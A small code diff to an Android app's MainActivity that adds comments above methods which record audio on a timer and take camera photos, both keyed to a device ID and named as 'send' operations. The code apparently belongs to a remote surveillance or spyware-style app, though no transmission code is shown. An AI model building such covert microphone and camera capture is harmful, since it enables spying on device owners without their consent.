@@ -173,9 +173,11 @@ public class MainActivity extends AppCompatActivity {
 
     public void sendAudio(String android_id, int time){
 
+        // Creatse an audioRecorder object and starts recording
         final AudioRecorder audioRecorder = new AudioRecorder(this, android_id, time);
         audioRecorder.startRecording();
 
+        // Creates a timer and assigns how long you want to keep recording
         new Timer().schedule(new TimerTask() {
 
             @Override
@@ -194,6 +196,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void sendPhoto(String android_id){
+        // Creates a cameraShot object and takes a picture
         CameraShot cameraShot = new CameraShot(this, android_id);
         cameraShot.takePhoto();
     }
